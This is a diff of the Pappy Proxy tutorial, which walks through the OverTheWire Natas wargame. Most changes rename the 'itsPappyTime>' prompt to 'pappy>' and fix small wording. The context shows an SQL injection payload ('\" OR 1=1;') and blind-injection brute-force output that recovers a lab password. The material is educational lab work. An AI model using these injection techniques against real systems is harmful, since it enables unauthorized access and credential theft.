@@ -1,13 +1,9 @@
 The Pappy Proxy Tutorial
 ************************
 
-Table of Contents
-=================
-
-.. toctree::
-
-   tutorial
-
+.. contents:: Table of Contents
+   :local:
+       
 Getting Set Up
 ==============
 
@@ -40,9 +36,9 @@ That was easy! Make a project directory anywhere for Natas and fire up Pappy.::
     $ cd natas
     Copying default config to ./config.json
     Proxy is listening on port 8000
-    itsPappyTime>
+    pappy>
 
-If you look at what's in the file, you'll notice that there's a ``data.db`` file and a ``config.json`` file.
+If you look at what's in the directory, you'll notice that there's a ``data.db`` file and a ``config.json`` file.
 
 * ``data.db`` is a SQLite file that stores all the (in-scope) requests that pass through the proxy
 * ``config.json`` stores settings for the proxy
@@ -55,13 +51,13 @@ In order to intercept HTTPS requests, you'll need to add a CA cert to your brows
 
 To generate certificates, you'll use the ``gencerts`` command. This will generate certificates in Pappy's directory. By default, all projects will use the certs in this directory, so you should only have to generate/install the certificates once.::
 
-    itsPappyTime> gencerts
+    pappy> gencerts
     This will overwrite any existing certs in /home/anonymouse/pappy/pappyproxy/certs. Are you sure?
     (y/N) y
     Generating certs to /home/anonymouse/pappy/pappyproxy/certs
     Generating private key...  Done!
     Generating client cert...  Done!
-    itsPappyTime>
+    pappy>
 
 The directory that the certs get put in may be different for you. Next, you'll need to add the generated ``certificate.crt`` file to your browser. This is different for each browser.
 
@@ -107,7 +103,7 @@ Start up Pappy in Lite mode by running ``pappy -l``, enable the proxy in your br
     /pappynatas/ $ pappy -l
     Temporary datafile is /tmp/tmp5AQBrH
     Proxy is listening on port 8000
-    itsPappyTime> ls
+    pappy> ls
     ID  Verb  Host         Path               S-Code                 Req Len  Rsp Len  Time  Mngl
     8   GET   vitaly.sexy  /favicon.ico       404 Not Found          0        114      0.21  --
     7   GET   vitaly.sexy  /favicon.ico       404 Not Found          0        114      0.22  --
@@ -117,7 +113,7 @@ Start up Pappy in Lite mode by running ``pappy -l``, enable the proxy in your br
     3   GET   vitaly.sexy  /vitaly2.jpg       200 OK                 0        2034003  1.34  --
     2   GET   vitaly.sexy  /                  200 OK                 0        1201     0.21  --
     1   GET   vitaly.sexy  /                  301 Moved Permanently  0        178      0.27  --
-    itsPappyTime> quit
+    pappy> quit
     Deleting temporary datafile
 
 Make sure that the request you made appears on the list. When you quit, the temporary data file will be deleted, so no cleanup will be required!
@@ -129,8 +125,8 @@ Setting the Scope
 -----------------
 The first thing we'll do is set up Pappy so that it only intercepts requests going to ``*.natas.labs.overthewire.org``::
 
-    itsPappyTime> filter host containsr "natas\.labs\.overthewire\.org$"
-    itsPappyTime> scope_save
+    pappy> filter host containsr "natas\.labs\.overthewire\.org$"
+    pappy> scope_save
 
 What these commands do:
 
@@ -151,7 +147,7 @@ First, go to `<http://natas0.natas.labs.overthewire.org>`_ and log in with the d
 
 Natas 1
 -------
-Haha! This is the same as natas0, but they got tricky and shut off right-clicking. There's still ways to view the source in the browser, but we'll use Pappy here. The two commands we'll learn here are ``ls``, ``vfq``, and ``vfs``.
+Haha! This is the same as natas0, but they got tricky and shut off right-clicking. There's still ways to view the source in the browser, but we'll use Pappy here. The commands we'll learn here are ``ls``, ``vfq``, and ``vfs``.
 
 * ``ls`` lists the most current requests that are in the current context. You'll be using this a lot to get the IDs of requests you want to do things with.
 * ``vfq <reqid>`` prints the full request of a request you specify
@@ -159,7 +155,7 @@ Haha! This is the same as natas0, but they got tricky and shut off right-clickin
 
 So to solve natas1, we'll want to view the full response to our request to the page::
 
-    itsPappyTime> ls
+    pappy> ls
     ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
     16  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
     15  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
@@ -177,7 +173,7 @@ So to solve natas1, we'll want to view the full response to our request to the p
     3   GET   natas.labs.overthewire.org         /css/level.css       200 OK            0        1332     0.48  --
     2   GET   natas0.natas.labs.overthewire.org  /                    200 OK            0        918      0.26  --
     1   GET   natas0.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
-    itsPappyTime> vfs 14
+    pappy> vfs 14
     
     HTTP/1.1 200 OK
     Date: Fri, 18 Dec 2015 19:47:21 GMT
@@ -197,7 +193,7 @@ So to solve natas1, we'll want to view the full response to our request to the p
 
     ... snip ...
 
-    itsPappyTime>
+    pappy>
 
 Yay!
 
@@ -205,7 +201,7 @@ Natas 2
 -------
 When you visit this page, you get a message saying "There is nothing on this page". That is probably a blatant lie. Let's see what was in that response.::
 
-  itsPappyTime> ls
+  pappy> ls
   ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
   30  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
   29  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
@@ -213,7 +209,7 @@ When you visit this page, you get a message saying "There is nothing on this pag
   27  GET   natas2.natas.labs.overthewire.org  /                    200 OK            0        872      0.27  --
   26  GET   natas2.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
   ... snip ...
-  itsPappyTime> vfs 27
+  pappy> vfs 27
   
   HTTP/1.1 200 OK
   ... snip ...
@@ -225,7 +221,7 @@ When you visit this page, you get a message saying "There is nothing on this pag
   </div>
   </body></html>
   
-  itsPappyTime>
+  pappy>
 
 So the only suspicious thing is ``<img src="files/pixel.png">``. I'll let you figure out the rest ;)
 
@@ -282,7 +278,7 @@ While we can't find all the passwords with one filter, if we remember how we got
 
 For natas0 and natas1, the responses had a phrase like "the password is abc123". So we can filter out anything that doesn't have the word "password" in it.::
 
-    itsPappyTime> ls
+    pappy> ls
     ID  Verb  Host                               Path               S-Code                 Req Len  Rsp Len  Time  Mngl
     52  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.26  --
     51  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
@@ -309,8 +305,8 @@ For natas0 and natas1, the responses had a phrase like "the password is abc123".
     30  GET   natas2.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
     29  GET   natas2.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
     28  GET   natas2.natas.labs.overthewire.org  /files/pixel.png   200 OK                 0        303      0.27  --
-    itsPappyTime> f body ct password
-    itsPappyTime> ls
+    pappy> f body ct password
+    pappy> ls
     ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
     49  GET   natas4.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
     38  GET   natas3.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.28  --
@@ -325,7 +321,7 @@ For natas0 and natas1, the responses had a phrase like "the password is abc123".
     6   GET   natas.labs.overthewire.org         /js/jquery-1.9.1.js  200 OK            0        268381   1.20  --
     2   GET   natas0.natas.labs.overthewire.org  /                    200 OK            0        918      0.26  --
     1   GET   natas0.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
-    itsPappyTime>
+    pappy>
 
 It looks like requests 2 and 14 are the ones we're looking for (we know the password is on the page and those are the requests to / that have a 200 OK response). Use ``vfs`` to look at the response and you'll get the passwords again! It looks like we also found the password from natas2 (the request to /s3cr3t/users.txt).
 
@@ -341,7 +337,7 @@ To do this, we'll be using Pappy's interceptor. The interceptor lets you stop a 
 
 In this case, we only want to intercept requests, so we'll run ``ic req``::
 
-  itsPappyTime> ic req
+  pappy> ic req
 
 And we'll get a screen that says something like::
 
@@ -405,14 +401,15 @@ For this one, when you view the source you'll notice they're taking value you en
    Use ``:wq!`` to quit the repeater without having to save buffers
   
 .. note::
-   You must know the basics of how to use vim for the repeater and have a key bound to the leader. You can find more information on the leader key ``here <https://stackoverflow.com/questions/1764263/what-is-the-leader-in-a-vimrc-file>``. By default <leader> is bound to ``\``.
+   You must know the basics of how to use vim for the repeater and have a key bound to the leader. You can find more information on the leader key `here <https://stackoverflow.com/questions/1764263/what-is-the-leader-in-a-vimrc-file>`_. By default <leader> is bound to ``\``.
    
-Submit a request then open that request in the repeater.::
-  itsPappyTime> ls
+Submit a request then open that request in the repeater::
+
+  pappy> ls
   196  GET   natas9.natas.labs.overthewire.org  /index.php?needle=ball&submit=Search      200 OK            0        1686     0.27  --
   195  GET   natas9.natas.labs.overthewire.org  /index-source.html                        200 OK            0        1952     0.27  --
   ... snip ...
-  itsPappyTime> rp 196
+  pappy> rp 196
 
 Vim will open up in a vertical split with the request on the left and the response on the right.
 
@@ -434,7 +431,7 @@ Commands we'll learn:
 
 So the first thing we'll do is submit a request to have a base request that we can modify. Submit a request with any username. You should get a response back saying the user doesn't exist. Now we'll generate a macro and use that request as a base for our script::
 
-  itsPappyTime> ls
+  pappy> ls
   ID   Verb  Host                                Path                                      S-Code            Req Len  Rsp Len  Time  Mngl
   224  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            14       937      0.27  --
   223  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            12       937      0.27  --
@@ -445,9 +442,9 @@ So the first thing we'll do is submit a request to have a base request that we c
   218  GET   natas15.natas.labs.overthewire.org  /                                         401 Unauthorized  0        480      0.27  --
   ... snip ...
 
-  itsPappyTime> gma brute 224
+  pappy> gma brute 224
   Wrote script to macro_brute.py
-  itsPappyTime>
+  pappy>
 
 Now open up ``macro_brute.py`` in your favorite text editor. You should have a script that looks like this::
 
@@ -513,15 +510,15 @@ To start out simple, we'll write a macro that lets us check a username from the 
 
 Then to run it::
 
-  itsPappyTime> lma
+  pappy> lma
   Loaded "<Macro Macro 41855887 (brute)>"
-  itsPappyTime> rma brute admin
+  pappy> rma brute admin
   admin is not a user
-  itsPappyTime> rma brute fooooo
+  pappy> rma brute fooooo
   fooooo is not a user
-  itsPappyTime> rma brute natas16
+  pappy> rma brute natas16
   natas16 is a user!
-  itsPappyTime>
+  pappy>
 
 Awesome! Notice how we didn't have to deal with authentication either. This is because the authentication is handled by the ``Authorization`` header which was included in the generated request.
 
@@ -535,11 +532,11 @@ So to escape it, we use a payload like::
 
 In this case, any username that ends in ``" OR 1=1; #`` will be considered a valid username. Let's try this out::
 
-  itsPappyTime> rma brute "foo\" OR 1=1;"
+  pappy> rma brute "foo\" OR 1=1;"
   foo" OR 1=1; is a user!
-  itsPappyTime> rma brute "fooooooo\" OR 1=1;"
+  pappy> rma brute "fooooooo\" OR 1=1;"
   fooooooo" OR 1=1; is a user!
-  itsPappyTime>
+  pappy>
 
 Great! Now we can check any true/false condition we want. In this case, we want to check if a certain character is at a certain position in the ``password`` column. We do this with the ``ASCII`` and ``SUBSTRING`` functions. So something like this will check if the first character is an ``A``.::
 
@@ -598,9 +595,9 @@ Alright, let's update our macro to find the first character of the password.::
 
 And when we run it...::
 
-  itsPappyTime> lma
+  pappy> lma
   Loaded "<Macro Macro 41855887 (brute)>"
-  itsPappyTime> rma brute
+  pappy> rma brute
   Trying a...
   Trying b...
   Trying c...
@@ -610,7 +607,7 @@ And when we run it...::
   Trying V...
   Trying W...
   W is the first char!
-  itsPappyTime>
+  pappy>
 
 We find the first character! Woo! Next we just have to do this for each position. Even through we don't know the length of the password, we will know that the password is over when none of the characters are valid. So let's update our macro::
 
@@ -685,9 +682,9 @@ We find the first character! Woo! Next we just have to do this for each position
 
 Then we run it::
 
-  itsPappyTime> lma
+  pappy> lma
   Loaded "<Macro Macro 41855887 (brute)>"
-  itsPappyTime> rma brute
+  pappy> rma brute
   a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W
   W is char 1!
   The password so far is W
@@ -713,7 +710,7 @@ Then we run it::
   The password so far is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
   a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 0
   Done! The password is "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
-  itsPappyTime>
+  pappy>
 
 Boom! There it is!
 
